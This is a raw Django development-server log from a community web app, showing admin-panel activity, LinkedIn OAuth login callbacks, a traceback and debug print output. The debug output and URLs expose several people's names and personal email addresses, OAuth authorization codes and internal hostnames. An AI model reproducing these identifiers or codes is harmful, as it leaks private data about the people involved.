[12/Dec/2018 11:42:44] "GET /requests HTTP/1.1" 200 5853
[12/Dec/2018 11:42:46] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 11:42:47] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 11:42:50] "GET /community/3/ HTTP/1.1" 200 11312
[12/Dec/2018 11:44:38] "GET /admin HTTP/1.1" 301 0
[12/Dec/2018 11:44:38] "GET /admin/ HTTP/1.1" 302 0
[12/Dec/2018 11:44:38] "GET /admin/ HTTP/1.1" 302 0
[12/Dec/2018 11:44:39] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1977
[12/Dec/2018 11:44:40] "GET /static/admin/css/login.css HTTP/1.1" 200 1203
[12/Dec/2018 11:44:40] "GET /static/admin/css/base.css HTTP/1.1" 304 0
[12/Dec/2018 11:44:40] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1977
[12/Dec/2018 11:44:41] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
[12/Dec/2018 11:44:41] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
[12/Dec/2018 11:44:42] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 80304
[12/Dec/2018 11:44:42] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 81348
[12/Dec/2018 11:44:42] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 82564
[12/Dec/2018 11:44:47] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
[12/Dec/2018 11:44:48] "GET /admin/ HTTP/1.1" 200 11306
[12/Dec/2018 11:44:48] "GET /static/admin/css/dashboard.css HTTP/1.1" 304 0
[12/Dec/2018 11:44:48] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 392
[12/Dec/2018 11:44:48] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
[12/Dec/2018 11:44:48] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
[12/Dec/2018 11:44:51] "GET /admin/togther/userinfo/ HTTP/1.1" 200 4821
[12/Dec/2018 11:44:52] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 363
[12/Dec/2018 11:44:52] "GET /static/admin/css/changelists.css HTTP/1.1" 304 0
[12/Dec/2018 11:44:52] "GET /static/admin/js/core.js HTTP/1.1" 304 0
[12/Dec/2018 11:44:52] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
[12/Dec/2018 11:44:52] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:44:52] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 304 0
[12/Dec/2018 11:44:53] "GET /static/admin/js/actions.js HTTP/1.1" 304 0
[12/Dec/2018 11:44:53] "GET /static/admin/js/urlify.js HTTP/1.1" 304 0
[12/Dec/2018 11:44:53] "GET /static/admin/js/prepopulate.js HTTP/1.1" 304 0
[12/Dec/2018 11:44:53] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 304 0
[12/Dec/2018 11:44:54] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 304 0
[12/Dec/2018 11:44:55] "GET /admin/togther/userinfo/4/change/ HTTP/1.1" 200 10666
[12/Dec/2018 11:44:55] "GET /static/admin/css/forms.css HTTP/1.1" 304 0
[12/Dec/2018 11:44:55] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:44:55] "GET /static/admin/js/change_form.js HTTP/1.1" 304 0
[12/Dec/2018 11:44:55] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 304 0
[12/Dec/2018 11:44:56] "GET /static/admin/css/widgets.css HTTP/1.1" 200 10340
[12/Dec/2018 11:45:26] "GET /admin/togther/userinfo/ HTTP/1.1" 200 4821
[12/Dec/2018 11:45:28] "GET /admin/togther/userinfo/3/change/ HTTP/1.1" 200 10697
[12/Dec/2018 11:45:28] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:45:39] "POST /admin/togther/userinfo/3/change/ HTTP/1.1" 200 11105
[12/Dec/2018 11:45:39] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:45:46] "POST /admin/togther/userinfo/3/change/ HTTP/1.1" 200 11105
[12/Dec/2018 11:45:47] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:45:50] "GET /admin/togther/userinfo/3/change/ HTTP/1.1" 200 10697
[12/Dec/2018 11:45:51] "GET /admin/togther/userinfo/3/change/ HTTP/1.1" 200 10697
[12/Dec/2018 11:45:51] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:46:56] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 11:46:57] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 11:46:57] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 11:46:58] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
Not Found: /logo.jpeg
[12/Dec/2018 11:46:59] "GET /logo.jpeg HTTP/1.1" 404 5958
[12/Dec/2018 11:47:02] "GET /community/4/ HTTP/1.1" 200 10626
[12/Dec/2018 11:47:03] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 11:47:04] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
Not Found: /community/4/logo.jpeg
[12/Dec/2018 11:47:04] "GET /community/4/logo.jpeg HTTP/1.1" 404 5994
[12/Dec/2018 11:47:11] "GET /community/4/ HTTP/1.1" 200 10626
[12/Dec/2018 11:47:12] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 11:47:12] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 11:47:24] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 11:47:25] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 11:47:26] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 11:47:26] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 11:47:26] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 11:47:26] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 11:47:27] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 11:47:27] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 11:48:41] "GET /admin/togther/ HTTP/1.1" 200 6500
[12/Dec/2018 11:48:43] "GET /admin/togther/admins/ HTTP/1.1" 200 4579
[12/Dec/2018 11:48:43] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:48:46] "GET /admin/togther/ HTTP/1.1" 200 6500
[12/Dec/2018 11:48:54] "GET /admin/togther/members/ HTTP/1.1" 200 5058
[12/Dec/2018 11:48:54] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:48:56] "GET /admin/togther/members/4/change/ HTTP/1.1" 200 6241
[12/Dec/2018 11:48:56] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:48:59] "GET /admin/togther/members/4/delete/ HTTP/1.1" 200 3239
[12/Dec/2018 11:49:00] "GET /static/admin/js/cancel.js HTTP/1.1" 200 410
[12/Dec/2018 11:49:01] "POST /admin/togther/members/4/delete/ HTTP/1.1" 302 0
[12/Dec/2018 11:49:02] "GET /admin/togther/members/ HTTP/1.1" 200 4985
[12/Dec/2018 11:49:02] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:49:03] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 200 436
[12/Dec/2018 11:49:04] "GET /admin/togther/ HTTP/1.1" 200 6500
[12/Dec/2018 11:49:06] "GET /admin/togther/requests/ HTTP/1.1" 200 5310
[12/Dec/2018 11:49:07] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:49:09] "GET /admin/togther/requests/5/change/ HTTP/1.1" 200 7941
[12/Dec/2018 11:49:09] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:49:12] "GET /admin/togther/requests/ HTTP/1.1" 200 5310
[12/Dec/2018 11:49:13] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:49:14] "GET /admin/togther/requests/4/change/ HTTP/1.1" 200 7941
[12/Dec/2018 11:49:15] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:49:17] "GET /admin/togther/requests/ HTTP/1.1" 200 5310
[12/Dec/2018 11:49:18] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:49:20] "GET /admin/togther/requests/3/change/ HTTP/1.1" 200 7941
[12/Dec/2018 11:49:20] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:49:22] "GET /admin/togther/requests/ HTTP/1.1" 200 5310
[12/Dec/2018 11:49:23] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:49:25] "GET /admin/togther/requests/2/change/ HTTP/1.1" 200 7941
[12/Dec/2018 11:49:25] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:49:29] "GET /admin/togther/requests/ HTTP/1.1" 200 5310
[12/Dec/2018 11:49:29] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:49:31] "GET /admin/togther/requests/4/change/ HTTP/1.1" 200 7941
[12/Dec/2018 11:49:31] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:49:34] "GET /admin/togther/requests/ HTTP/1.1" 200 5310
[12/Dec/2018 11:49:34] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:49:36] "GET /admin/togther/requests/2/change/ HTTP/1.1" 200 7941
[12/Dec/2018 11:49:37] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:49:41] "POST /admin/togther/requests/2/change/ HTTP/1.1" 302 0
[12/Dec/2018 11:49:41] "GET /admin/togther/requests/ HTTP/1.1" 200 5510
[12/Dec/2018 11:49:42] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 37, in dashboard
    print(social_user.extra_data['id'])
AttributeError: 'NoneType' object has no attribute 'extra_data'
[12/Dec/2018 11:49:47] "GET / HTTP/1.1" 500 67381
[12/Dec/2018 11:49:52] "GET /logout HTTP/1.1" 302 0
[12/Dec/2018 11:49:53] "GET /login/ HTTP/1.1" 200 2576
[12/Dec/2018 11:49:55] "GET /oauth/login/linkedin-oauth2/ HTTP/1.1" 302 0
[12/Dec/2018 11:50:04] "GET /oauth/complete/linkedin-oauth2/?code=AQSgTyoM5RCGUMi9FVBTINF9qxuUY_G1jL7CUxPixExpgbsZOmG2yleOzi8IT9DmFpBKIIDa3ilY8ef5bFuTHB_c1JQ0r69EkDWh3z9sUQgSuMP8NoBzBBZzlXSdwvPxy9RqlifHUUILAOIfwHymWmqcn310e18GeMa8crIvlUEfu89u1_iWMRUPfZ6v7g&state=ofKL2q7HusoxZM5souT4KNn8OGuLkznv HTTP/1.1" 302 0
[12/Dec/2018 11:50:05] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 11:50:11] "GET /community/3/ HTTP/1.1" 200 10748
[12/Dec/2018 11:50:20] "GET /profile/3 HTTP/1.1" 200 22745
[12/Dec/2018 11:50:23] "GET /profile/3 HTTP/1.1" 200 22745
[12/Dec/2018 11:50:23] "GET /requests HTTP/1.1" 200 7272
[12/Dec/2018 11:50:28] "GET /requests?status=1&id=2&_=1544615424301 HTTP/1.1" 200 16
[12/Dec/2018 11:50:37] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 11:50:37] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 11:50:42] "GET /admin/ HTTP/1.1" 302 0
[12/Dec/2018 11:50:43] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1977
[12/Dec/2018 11:50:43] "GET /admin/ HTTP/1.1" 302 0
[12/Dec/2018 11:50:44] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1977
[12/Dec/2018 11:50:51] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
[12/Dec/2018 11:50:51] "GET /admin/ HTTP/1.1" 200 11866
[12/Dec/2018 11:50:55] "GET /admin/togther/community/ HTTP/1.1" 200 4628
[12/Dec/2018 11:50:55] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:50:57] "GET /admin/togther/community/3/change/ HTTP/1.1" 200 7544
[12/Dec/2018 11:50:57] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:51:02] "POST /admin/togther/community/3/change/ HTTP/1.1" 302 0
[12/Dec/2018 11:51:03] "GET /admin/togther/community/ HTTP/1.1" 200 4827
[12/Dec/2018 11:51:03] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 11:51:05] "GET /logout HTTP/1.1" 302 0
[12/Dec/2018 11:51:05] "GET /login/ HTTP/1.1" 200 2576
[12/Dec/2018 11:51:06] "GET /login/ HTTP/1.1" 200 2576
[12/Dec/2018 11:51:08] "GET /oauth/login/linkedin-oauth2/ HTTP/1.1" 302 0
[12/Dec/2018 11:51:10] "GET /oauth/complete/linkedin-oauth2/?code=AQQWha2-LNsfIXed4wGO9A7SZOgWUYnDcG32bXeh5bwWE0oU8A7Dwtw7xNzstchNCDryNkAMGrPw80ZYuNtRF6jAu1cbWpNODWbioirrxRQp7J_5lZnEarFkiuxs0bhzefHdwiUPU76EqW_EnKo6zUNgRFjr7Anx38wl_-Zu0Mt8tDzYd1ZhLtf9ppyxNw&state=cPuhSsSOJvZ5cFhhGe8T3Y37YgWt5jK9 HTTP/1.1" 302 0
[12/Dec/2018 11:51:10] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 11:55:57] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 11:55:57] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 11:55:57] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 11:56:56] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 11:56:56] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 11:56:56] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 11:56:59] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 11:56:59] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 11:56:59] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 11:57:18] "GET /community/4/ HTTP/1.1" 200 10626
[12/Dec/2018 11:57:18] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 11:57:18] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 11:57:40] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 11:57:41] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
[12/Dec/2018 11:57:41] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 11:57:41] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
Not Found: /logo.jpeg
[12/Dec/2018 11:57:42] "GET /logo.jpeg HTTP/1.1" 404 5958
[12/Dec/2018 11:57:52] "GET /community/4/ HTTP/1.1" 200 10307
[12/Dec/2018 11:57:53] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 11:57:53] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
[12/Dec/2018 11:57:53] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
Not Found: /community/4/logo.jpeg
[12/Dec/2018 11:57:53] "GET /community/4/logo.jpeg HTTP/1.1" 404 5994
[12/Dec/2018 11:58:06] "GET /requests HTTP/1.1" 200 10209
[12/Dec/2018 11:58:11] "GET /community/4/ HTTP/1.1" 200 10307
[12/Dec/2018 11:58:15] "GET /requests HTTP/1.1" 200 10209
[12/Dec/2018 11:58:19] "GET /requests?status=1&id=4&_=1544615895762 HTTP/1.1" 200 16
[12/Dec/2018 11:58:30] "GET /requests?status=1&id=4&_=1544615895763 HTTP/1.1" 200 16
[12/Dec/2018 11:58:35] "GET /requests HTTP/1.1" 200 8763
[12/Dec/2018 11:58:36] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 11:58:37] "GET /requests HTTP/1.1" 200 8763
[12/Dec/2018 11:58:38] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 11:58:42] "GET /requests HTTP/1.1" 200 8763
[12/Dec/2018 11:58:43] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 11:58:52] "GET /requests?status=1&id=3&_=1544615922760 HTTP/1.1" 200 16
[12/Dec/2018 11:58:57] "GET /requests?status=1&id=5&_=1544615922761 HTTP/1.1" 200 16
[12/Dec/2018 11:59:01] "GET /requests HTTP/1.1" 200 5869
[12/Dec/2018 11:59:01] "GET /requests HTTP/1.1" 200 5869
[12/Dec/2018 11:59:17] "GET /requests HTTP/1.1" 200 5869
[12/Dec/2018 11:59:17] "GET /requests HTTP/1.1" 200 5869
[12/Dec/2018 11:59:18] "GET /requests HTTP/1.1" 200 5869
[12/Dec/2018 11:59:18] "GET /requests HTTP/1.1" 200 5869
[12/Dec/2018 11:59:19] "GET /requests HTTP/1.1" 200 5869
[12/Dec/2018 11:59:21] "GET /requests HTTP/1.1" 200 5869
[12/Dec/2018 11:59:23] "GET /requests HTTP/1.1" 200 5869
[12/Dec/2018 11:59:24] "GET /profile/5 HTTP/1.1" 200 22982
Not Found: /profile/logo.jpeg
[12/Dec/2018 11:59:26] "GET /profile/logo.jpeg HTTP/1.1" 404 5982
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 11:59:41] "GET / HTTP/1.0" 400 62438
[12/Dec/2018 11:59:48] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 11:59:49] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 11:59:49] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
Not Found: /profile/logo.jpeg
[12/Dec/2018 11:59:50] "GET /profile/logo.jpeg HTTP/1.1" 404 5982
[12/Dec/2018 12:00:02] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 12:00:19] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 12:00:20] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:00:20] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:00:57] "GET /community/4/ HTTP/1.1" 200 12573
[12/Dec/2018 12:01:02] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:01:03] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:01:04] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:01:04] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:01:14] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 12:01:15] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:01:15] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:01:16] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:01:17] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:01:18] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:01:18] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:01:24] "GET /community/4/members_list HTTP/1.1" 200 8316
[12/Dec/2018 12:01:25] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:01:25] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 12:01:26] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:01:26] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:02:56] "GET /requests HTTP/1.1" 200 5821
[12/Dec/2018 12:02:57] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:03:00] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 12:03:00] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:03:01] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
Not Found: /profile/4/logo.jpeg
[12/Dec/2018 12:03:01] "GET /profile/4/logo.jpeg HTTP/1.1" 404 5988
[12/Dec/2018 12:03:03] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 12:03:04] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:03:04] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:03:06] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5416
[12/Dec/2018 12:03:07] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:03:10] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 12:03:11] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:03:11] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:03:12] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:03:14] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:03:14] "GET /login/ HTTP/1.1" 302 0
Performing system checks...

System check identified no issues (0 silenced).

You have 1 unapplied migration(s). Your project may not work properly until you apply the migrations for app(s): togther.
Run 'python manage.py migrate' to apply them.
December 12, 2018 - 11:35:51
Django version 2.1, using settings 'project.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
here
None
here
None
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
here
None
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (1)>]>
1
admin:  [<QuerySet [<Userinfo: Apoorv Khare>]>]
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>]
{}
<QuerySet [<Admins: Admins object (1)>]>
3
3
3
3
3
[<Requests: Requests object (1)>, <Requests: Requests object (2)>]
{'status': '1', 'id': '2', '_': '1544614883721'}
Requests object (2)
1
apoorvkhare007@gmail.com
{}
<QuerySet [<Admins: Admins object (1)>]>
3
3
3
3
3
[<Requests: Requests object (1)>, <Requests: Requests object (2)>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (1)>]>
1
admin:  [<QuerySet [<Userinfo: Apoorv Khare>]>]
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Nipun Goyal>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
here
None
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (1)>]>
1
admin:  [<QuerySet [<Userinfo: Apoorv Khare>]>]
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>]
{}
: [<Community: test_community_1>]
{}
: [<Community: test_community_1>]
{}
<QuerySet [<Admins: Admins object (1)>]>
3
3
3
3
3
[<Requests: Requests object (1)>, <Requests: Requests object (2)>]
{'status': '1', 'id': '2', '_': '1544615424301'}
Requests object (2)
1
nipungoyal.iitd@gmail.com 
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
here
None
here
None
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
{}
<QuerySet [<Admins: Admins object (2)>]>
4
4
4
4
4
[<Requests: Requests object (3)>, <Requests: Requests object (4)>, <Requests: Requests object (5)>]
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
{}
<QuerySet [<Admins: Admins object (2)>]>
4
4
4
4
4
[<Requests: Requests object (3)>, <Requests: Requests object (4)>, <Requests: Requests object (5)>]
{'status': '1', 'id': '4', '_': '1544615895762'}
Requests object (4)
1
apoorvkhare007@gmail.com
{'status': '1', 'id': '4', '_': '1544615895763'}
Requests object (4)
1
apoorvkhare007@gmail.com
{}
<QuerySet [<Admins: Admins object (2)>]>
4
4
4
4
4
[<Requests: Requests object (3)>, <Requests: Requests object (5)>, <Requests: Requests object (4)>]
{}
<QuerySet [<Admins: Admins object (2)>]>
4
4
4
4
4
[<Requests: Requests object (3)>, <Requests: Requests object (5)>, <Requests: Requests object (4)>]
{}
<QuerySet [<Admins: Admins object (2)>]>
4
4
4
4
4
[<Requests: Requests object (3)>, <Requests: Requests object (5)>, <Requests: Requests object (4)>]
{'status': '1', 'id': '3', '_': '1544615922760'}
Requests object (3)
1
anshu.abhishek@gmail.com
{'status': '1', 'id': '5', '_': '1544615922761'}
Requests object (5)
1
anshu.abhishek@gmail.com
{}
